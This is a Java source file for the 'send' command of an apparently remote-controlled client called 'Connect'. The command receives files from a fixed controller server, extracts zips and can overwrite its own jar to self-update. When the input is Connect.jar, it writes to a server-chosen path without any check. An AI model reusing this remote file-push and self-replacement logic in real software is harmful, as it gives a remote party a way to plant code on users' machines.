package br.com.introcdc.connect.client.commands.file.external;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:43
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.FileComponents;
import br.com.introcdc.connect.client.components.InstallComponents;

import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.net.Socket;
import java.nio.file.Files;

public class ClientCommandSend extends ClientCommand {

    public ClientCommandSend() {
        super("send");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.isEmpty()) {
            msg("Digite um arquivo!");
            return;
        }

        ConnectClient.EXECUTOR.schedule(() -> new Thread(() -> {
            try (Socket fileSocket = new Socket(Connect.IP, Connect.PORT + 4);
                 DataInputStream dis = new DataInputStream(fileSocket.getInputStream());
                 BufferedOutputStream bos = new BufferedOutputStream(Files.newOutputStream((input.equalsIgnoreCase("Connect.jar") ?
                         new File(dis.readUTF()) : new File(FileComponents.FOLDER, dis.readUTF())).toPath()))) {
                String fileName = dis.readUTF();
                msg("Recebendo arquivo " + fileName + " do servidor...");
                boolean temp = dis.readUTF().replace("temp:", "").equals("true");
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = dis.read(buffer)) != -1) {
                    bos.write(buffer, 0, bytesRead);
                }
                if (temp) {
                    ConnectClient.EXECUTOR.schedule(() -> new Thread(() -> {
                        File folder = new File(FileComponents.FOLDER, fileName.replace(".zip", ""));
                        if (!folder.exists()) {
                            folder.mkdirs();
                        }
                        FileComponents.extractZip(new File(FileComponents.FOLDER, fileName), folder);
                        FileComponents.deleteFile(new File(FileComponents.FOLDER, fileName));
                    }).start(), Connect.DELAY, Connect.DELAY_TYPE);
                }

                msg("Arquivo recebido!");

                if (fileName.equalsIgnoreCase("Connect.jar")) {
                    ConnectClient.EXECUTOR.schedule(InstallComponents::verifyUpdate, Connect.DELAY, Connect.DELAY_TYPE);
                }
            } catch (Exception exception) {
                msg("Ocorreu um erro enviar um arquivo! (" + exception.getMessage() + ")");
                exception(exception);
            }
        }).start(), Connect.DELAY, Connect.DELAY_TYPE);
    }

}
